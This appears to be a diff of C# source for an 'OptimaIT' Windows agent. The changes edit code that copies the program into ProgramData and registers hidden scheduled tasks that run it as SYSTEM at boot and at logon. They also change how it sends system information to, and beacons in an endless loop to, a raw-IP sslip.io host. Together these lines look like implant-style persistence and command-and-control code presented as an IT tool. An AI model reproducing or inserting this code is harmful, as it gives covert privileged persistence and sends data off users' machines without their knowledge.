@@ -960,7 +960,7 @@ namespace OptimaIT
                 {
                     try
                     {
-                        string targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "OptimaIT");
+                        string targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "OptimaIT");
                         if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
                         string targetExe = Path.Combine(targetDir, "OptimaIT_Heartbeat.exe");
                         File.Copy(Application.ExecutablePath, targetExe, true);
@@ -974,7 +974,7 @@ namespace OptimaIT
                         try
                         {
                             // 1. Task on system boot (runs at Windows startup as SYSTEM before user logs in)
-                            ProcessStartInfo psiBoot = new ProcessStartInfo("schtasks.exe", "/create /tn \"OptimaIT_Heartbeat_Boot\" /tr \"\\\"" + targetExe + "\\\" " + sessionId + " empresa --silent\" /sc onstart /ru SYSTEM /rl highest /f");
+                            ProcessStartInfo psiBoot = new ProcessStartInfo("schtasks.exe", "/create /tn \"OptimaIT_Heartbeat_Boot\" /tr \"" + targetExe + " " + sessionId + " empresa --silent\" /sc onstart /ru SYSTEM /rl highest /f");
                             psiBoot.UseShellExecute = false;
                             psiBoot.CreateNoWindow = true;
                             using (Process pBoot = Process.Start(psiBoot)) { if (pBoot != null) pBoot.WaitForExit(3000); }
@@ -984,7 +984,7 @@ namespace OptimaIT
                         try
                         {
                             // 2. Task on user logon (ensures running if user logs in)
-                            ProcessStartInfo psiTask = new ProcessStartInfo("schtasks.exe", "/create /tn \"OptimaIT_Heartbeat\" /tr \"\\\"" + targetExe + "\\\" " + sessionId + " empresa --silent\" /sc onlogon /rl highest /f");
+                            ProcessStartInfo psiTask = new ProcessStartInfo("schtasks.exe", "/create /tn \"OptimaIT_Heartbeat\" /tr \"" + targetExe + " " + sessionId + " empresa --silent\" /sc onlogon /rl highest /f");
                             psiTask.UseShellExecute = false;
                             psiTask.CreateNoWindow = true;
                             using (Process pTask = Process.Start(psiTask)) { if (pTask != null) pTask.WaitForExit(3000); }
@@ -1203,9 +1203,8 @@ namespace OptimaIT
                     using (WebClient wcSys = new WebClient())
                     {
                         wcSys.Proxy = null;
-                        wcSys.Headers[HttpRequestHeader.Host] = "optimait.155.133.197.176.sslip.io";
                         wcSys.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
-                        wcSys.UploadString("http://optimait.155.133.197.176.sslip.io/api.php?action=heartbeat&session_id=" + Uri.EscapeDataString(sId), "POST", "sysinfo=" + Uri.EscapeDataString(sysJson));
+                        wcSys.UploadString("https://optimait.155.133.197.176.sslip.io/api.php?action=heartbeat&session_id=" + Uri.EscapeDataString(sId), "POST", "sysinfo=" + Uri.EscapeDataString(sysJson));
                     }
                 }
                 catch { }
@@ -1214,7 +1213,8 @@ namespace OptimaIT
                 while (true)
                 {
                     string[] hbUrls = new string[] {
-                        "http://optimait.155.133.197.176.sslip.io/api.php?action=heartbeat&session_id=" + Uri.EscapeDataString(sId),
+                        "https://optimait.155.133.197.176.sslip.io/api.php?action=heartbeat&session_id=" + Uri.EscapeDataString(sId),
+                        "https://" + sHost + "/api.php?action=heartbeat&session_id=" + Uri.EscapeDataString(sId),
                         "http://" + sHost + "/api.php?action=heartbeat&session_id=" + Uri.EscapeDataString(sId)
                     };
                     foreach (string hUrl in hbUrls)
@@ -1224,7 +1224,6 @@ namespace OptimaIT
                             using (WebClient wc = new WebClient())
                             {
                                 wc.Proxy = null;
-                                wc.Headers[HttpRequestHeader.Host] = "optimait.155.133.197.176.sslip.io";
                                 wc.Headers[HttpRequestHeader.UserAgent] = "OptimaIT-Agent";
                                 wc.DownloadString(hUrl);
                                 break;
